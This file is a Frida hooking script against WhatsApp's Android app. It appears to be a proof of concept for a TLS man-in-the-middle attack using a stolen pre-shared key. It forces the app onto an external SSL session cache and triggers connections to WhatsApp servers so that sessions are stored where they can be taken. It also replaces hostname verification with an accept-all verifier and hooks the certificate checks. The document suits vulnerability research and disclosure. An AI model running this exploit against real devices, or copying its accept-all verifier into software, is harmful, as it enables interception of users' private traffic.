var MEDIA_DOWNLOAD_CONNECTION = "X.0BX";
var MEDIA_DOWNLOAD_RESPONSE = "X.2mM";
var EXTERNAL_SSL_CACHE_TRUST_MANAGER = "X.38G";

Java.perform(function() {

    //
    // Hook `checkServerTrusted()' to make sure it's not called when doing the
    // MitM with the stolen PSK. If the MitM succeeds, you shouldn't see the
    // message printed here.
    //
    var ExternalSSLCacheTrustManager = Java.use(EXTERNAL_SSL_CACHE_TRUST_MANAGER);
    ExternalSSLCacheTrustManager.checkServerTrusted.implementation = function(_1, _2) {
        console.error("Verifying certificate chain :-(");
        return this.checkServerTrusted(_1, _2);
    }

    //
    // Replace the hostname verifier as well. This should not be called when
    // doing MitM.
    //
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    var AllowAllHostnameVerifier = Java.use("org.apache.http.conn.ssl.AllowAllHostnameVerifier");
    HttpsURLConnection.setDefaultHostnameVerifier(AllowAllHostnameVerifier.$new());

    //
    // In a successful MitM the path validator should not be called either.
    //
    var PKIXCertPathValidator = Java.use("sun.security.provider.certpath.PKIXCertPathValidator");
    PKIXCertPathValidator.validate.overload("sun.security.provider.certpath.PKIX$ValidatorParams").implementation = function(params) {
        return this.validate(params);
        // return null;
    }
});

function connect(hostname) {
    Java.perform(function() {
        var MediaDownloadConnection = Java.use(MEDIA_DOWNLOAD_CONNECTION);
        var MediaDownloadResponse = Java.use(MEDIA_DOWNLOAD_RESPONSE);

        //
        // Force WhatsApp to use the external SSL session cache instead of the WaTLS
        // cache.
        //

        // isWatlsDNSEnabled()
        MediaDownloadConnection.A05.implementation = function() {
            return false;
        }

        // isWatlsEnabled()
        MediaDownloadConnection.A06.implementation = function() {
            return false;
        }

        var url = Java.use("java.net.URL").$new("https://" + hostname);

        // getInstance()
        var mediaDownloadConnection = MediaDownloadConnection.A00();

        // connect()
        var mediaDownloadResponse = mediaDownloadConnection.A03(url, hostname, "GET");
        mediaDownloadResponse = Java.cast(mediaDownloadResponse, MediaDownloadResponse);

        // getResponseCode()
        console.log("Response code : " + mediaDownloadResponse.A3G());

        mediaDownloadResponse.close();
    });
}

//
// For testing purposes only.
//
function connect_lan() {
    connect("192.168.1.100");
}

function connect_crashlogs() {
    connect("crashlogs.whatsapp.net");
}

function connect_static() {
    connect("static.whatsapp.net");
}

//
// Force WhatsApp to connect to its TLS v1.2 servers and store fresh serialized
// sessions in the device's external storage.
//
function refresh_serialized_sessions() {
    connect_crashlogs();
    connect_static();
}

